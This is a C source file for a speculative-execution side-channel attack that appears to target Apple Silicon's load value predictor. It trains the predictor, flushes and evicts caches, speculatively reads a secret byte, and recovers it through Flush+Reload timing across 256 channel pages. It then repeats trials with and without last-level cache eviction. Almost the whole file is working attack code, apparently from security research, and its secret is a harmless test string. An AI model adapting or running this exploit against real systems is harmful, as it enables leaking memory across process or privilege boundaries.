/*
 * attack-diag.c — Run the exact oob-read attack for byte 0 and print
 *                 all 256 channel timings to see if speculation fires.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <time.h>

#define PAGE_SZ 16384
#define CACHE_LINE_SZ 128
#define NUM_CACHELINES PAGE_SZ / CACHE_LINE_SZ
#define REPS 300
#define EVICT_SIZE (48UL * 1024 * 1024)

#define READ(addr) (*(volatile uint32_t *)(addr))
#define FORCE_READ(addr, trash) (READ((uintptr_t)(addr) | (trash == 0xbaaaaad)))

const char *secret = "Mr and Mrs Dursley, of number four, Privet Drive, were proud to say that they were perfectly normal, thank you very much. They were the last people youd expect to be involved in anything strange or mysterious, because they just didnt hold with such nonsense.";

inline __attribute__((always_inline)) void clflush(void *ptr)
{
    asm volatile("dc civac, %0" : : "r"(ptr) : "memory");
}

inline __attribute__((always_inline)) uint64_t rdtsc()
{
    uint64_t ts;
    asm volatile("dsb ish");
    asm volatile("isb");
    asm volatile("mrs %0, S3_2_c15_c0_0" : "=r"(ts) : :);
    asm volatile("isb");
    return ts;
}

void shuffle(volatile int *array, volatile int n)
{
    if (n > 1)
        for (int i = 0; i < n - 1; i++)
        {
            volatile int j = i + rand() / (RAND_MAX / (n - i) + 1);
            volatile int temp = array[j];
            array[j] = array[i];
            array[i] = temp;
        }
}

/* EXACT same critical_section as oob-read.c */
__attribute__((noinline)) void critical_section(void *page, volatile int *indices, volatile unsigned char *channel_ptr, unsigned char *dummy_ptr, unsigned char *secret_ptr, int iters)
{
    unsigned char *aop[2];
    aop[0] = secret_ptr;
    aop[1] = dummy_ptr;

    register uint64_t trash = 0;
    for (int i = 0; i < iters; i++)
    {
        volatile int idx = indices[i % NUM_CACHELINES];
        trash = FORCE_READ((volatile char *)page + idx * CACHE_LINE_SZ, trash);
        register unsigned char *ptr = aop[(uint8_t)trash];
        volatile unsigned char junk = channel_ptr[*ptr * PAGE_SZ];
    }
}

int main()
{
    srand(time(NULL));

    uint32_t CORE_ID = 5;
    if (sysctlbyname("kern.sched_thread_bind_cpu", NULL, NULL, &CORE_ID, sizeof(uint32_t)) == -1)
    {
        printf("Error setting CPU core affinity. Run as root.\n");
        return 1;
    }

    void *page = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(page, 0x0, PAGE_SZ);

    volatile int indices[NUM_CACHELINES];
    for (int i = 0; i < NUM_CACHELINES; i++) indices[i] = i;
    shuffle(indices, NUM_CACHELINES);

    void *dummy_page = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(dummy_page, 0xff, PAGE_SZ);
    unsigned char *dummy_ptr = (unsigned char *)dummy_page;

    void *secret_page = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    strcpy((char *)secret_page, secret);
    unsigned char *secret_ptr = (unsigned char *)secret_page;

    void *channel_pages = mmap(NULL, 256 * PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(channel_pages, 0x99, 256 * PAGE_SZ);
    unsigned char *channel_ptr = (unsigned char *)channel_pages;

    // Allocate SLC eviction buffer
    void *evict_buf = mmap(NULL, EVICT_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (evict_buf == MAP_FAILED)
    {
        printf("Failed to allocate eviction buffer\n");
        return 1;
    }
    memset(evict_buf, 0xAA, EVICT_SIZE);

    printf("Secret byte 0 = '%c' (0x%02x)\n", secret[0], (unsigned char)secret[0]);
    printf("Dummy value = 0xff\n");
    printf("SLC eviction: %lu MB\n\n", EVICT_SIZE / (1024 * 1024));

    /* ====== Run the exact oob-read attack for byte 0 ====== */

    // Reset page
    memset(page, 0x0, PAGE_SZ);

    // Train LVP (300 iterations, both pointers are dummy)
    critical_section(page, indices, channel_ptr, dummy_ptr, dummy_ptr, REPS);

    // Flush the cache channel
    for (int set = 0; set < 256; ++set)
        clflush((void *)(channel_ptr + set * PAGE_SZ));

    // Change ground truth to 0x01
    memset(page, 0x1, PAGE_SZ);

    // Flush the page
    for (int i = 0; i < NUM_CACHELINES; i++)
        clflush((void *)((volatile char *)page + i * CACHE_LINE_SZ));

    // Single SLC eviction walk (push both channel and page from SLC to DRAM)
    for (size_t off = 0; off < EVICT_SIZE; off += CACHE_LINE_SZ)
        (void)(*(volatile char *)((char *)evict_buf + off));
    asm volatile("dsb ish");
    asm volatile("isb");

    // Pre-warm secret byte into L1 so speculative chain can complete
    (void)(*(volatile unsigned char *)secret_ptr);
    asm volatile("dsb ish");
    asm volatile("isb");

    // Attack: 1 iteration with secret
    critical_section(page, indices, channel_ptr, dummy_ptr, secret_ptr, 1);

    // Measure ALL 256 channel pages
    uint64_t timings[256];
    for (int i = 0; i < 256; ++i)
    {
        uint64_t t1 = rdtsc();
        volatile unsigned char trash = channel_ptr[i * PAGE_SZ];
        uint64_t t2 = rdtsc();
        timings[i] = t2 - t1;
    }

    // Print results
    printf("=== Channel timings after attack (byte 0 = 'M' = 0x4D) ===\n");
    printf("Expected speculative hit at 0x4D, architectural hit at 0xFF\n\n");

    // Print all pages below 200 cycles
    printf("Pages below 200 cycles:\n");
    for (int j = 0; j < 256; j++)
    {
        if (timings[j] < 200)
        {
            printf("  channel[0x%02x] = %llu cycles", j, timings[j]);
            if (j == 0x4D) printf("  <-- expected (secret 'M')");
            if (j == 0xFF) printf("  <-- architectural (dummy 0xFF)");
            if (j == 0x20) printf("  <-- space");
            printf("\n");
        }
    }

    // Print histogram
    printf("\nHistogram of all 256 pages:\n");
    int bucket_85 = 0, bucket_100 = 0, bucket_200 = 0, bucket_400 = 0, bucket_high = 0;
    for (int j = 0; j < 256; j++)
    {
        if (timings[j] < 90) bucket_85++;
        else if (timings[j] < 150) bucket_100++;
        else if (timings[j] < 300) bucket_200++;
        else if (timings[j] < 500) bucket_400++;
        else bucket_high++;
    }
    printf("  < 90 cyc (L1 hit):   %d pages\n", bucket_85);
    printf("  90-149 cyc (L2/SLC): %d pages\n", bucket_100);
    printf("  150-299 cyc (slow):  %d pages\n", bucket_200);
    printf("  300-499 cyc (DRAM):  %d pages\n", bucket_400);
    printf("  >= 500 cyc:          %d pages\n", bucket_high);

    /* ====== Run 10 more trials to check consistency ====== */
    printf("\n=== 10 repeated trials: which page is argmin in 32-127? ===\n");
    for (int trial = 0; trial < 10; trial++)
    {
        memset(page, 0x0, PAGE_SZ);
        critical_section(page, indices, channel_ptr, dummy_ptr, dummy_ptr, REPS);

        for (int set = 0; set < 256; ++set)
            clflush((void *)(channel_ptr + set * PAGE_SZ));

        memset(page, 0x1, PAGE_SZ);

        for (int i = 0; i < NUM_CACHELINES; i++)
            clflush((void *)((volatile char *)page + i * CACHE_LINE_SZ));

        // Single SLC eviction walk
        for (size_t off = 0; off < EVICT_SIZE; off += CACHE_LINE_SZ)
            (void)(*(volatile char *)((char *)evict_buf + off));
        asm volatile("dsb ish");
        asm volatile("isb");

        // Pre-warm secret byte
        (void)(*(volatile unsigned char *)secret_ptr);
        asm volatile("dsb ish");
        asm volatile("isb");

        critical_section(page, indices, channel_ptr, dummy_ptr, secret_ptr, 1);

        uint64_t trial_timings[256];
        for (int i = 0; i < 256; ++i)
        {
            uint64_t t1 = rdtsc();
            volatile unsigned char trash = channel_ptr[i * PAGE_SZ];
            uint64_t t2 = rdtsc();
            trial_timings[i] = t2 - t1;
        }

        // Find argmin in 32-127
        int best_j = -1;
        uint64_t best_t = UINT64_MAX;
        for (int j = 32; j < 128; j++)
        {
            if (trial_timings[j] < best_t)
            {
                best_t = trial_timings[j];
                best_j = j;
            }
        }

        // Count pages below 100 in 32-127
        int hits = 0;
        for (int j = 32; j < 128; j++)
            if (trial_timings[j] < 100) hits++;

        printf("  Trial %2d: argmin=0x%02x '%c' (%llu cyc), pages<100 in [32,127]: %d, 0x4D=%llu, 0xFF=%llu\n",
               trial, best_j, (best_j >= 32 && best_j < 127) ? best_j : '?', best_t,
               hits, trial_timings[0x4D], trial_timings[0xFF]);
    }

    /* ====== Test with pre-warmed secret ====== */
    printf("\n=== Same attack but WITHOUT SLC eviction (narrow L2 gap) ===\n");
    for (int trial = 0; trial < 10; trial++)
    {
        memset(page, 0x0, PAGE_SZ);
        critical_section(page, indices, channel_ptr, dummy_ptr, dummy_ptr, REPS);

        for (int set = 0; set < 256; ++set)
            clflush((void *)(channel_ptr + set * PAGE_SZ));

        memset(page, 0x1, PAGE_SZ);

        for (int i = 0; i < NUM_CACHELINES; i++)
            clflush((void *)((volatile char *)page + i * CACHE_LINE_SZ));

        // NO SLC eviction — test if LVP signal appears in the narrow L1 vs L2 gap
        asm volatile("dsb ish");
        asm volatile("isb");

        // Pre-warm secret byte
        (void)(*(volatile unsigned char *)secret_ptr);
        asm volatile("dsb ish");
        asm volatile("isb");

        critical_section(page, indices, channel_ptr, dummy_ptr, secret_ptr, 1);

        uint64_t trial_timings[256];
        for (int i = 0; i < 256; ++i)
        {
            uint64_t t1 = rdtsc();
            volatile unsigned char trash = channel_ptr[i * PAGE_SZ];
            uint64_t t2 = rdtsc();
            trial_timings[i] = t2 - t1;
        }

        int best_j = -1;
        uint64_t best_t = UINT64_MAX;
        for (int j = 32; j < 128; j++)
        {
            if (trial_timings[j] < best_t)
            {
                best_t = trial_timings[j];
                best_j = j;
            }
        }

        int hits = 0;
        for (int j = 32; j < 128; j++)
            if (trial_timings[j] < 100) hits++;

        printf("  Trial %2d: argmin=0x%02x '%c' (%llu cyc), pages<100 in [32,127]: %d, 0x4D=%llu, 0xFF=%llu\n",
               trial, best_j, (best_j >= 32 && best_j < 127) ? best_j : '?', best_t,
               hits, trial_timings[0x4D], trial_timings[0xFF]);
    }

    munmap(page, PAGE_SZ);
    munmap(dummy_page, PAGE_SZ);
    munmap(secret_page, PAGE_SZ);
    munmap(channel_pages, 256 * PAGE_SZ);
    munmap(evict_buf, EVICT_SIZE);
    return 0;
}
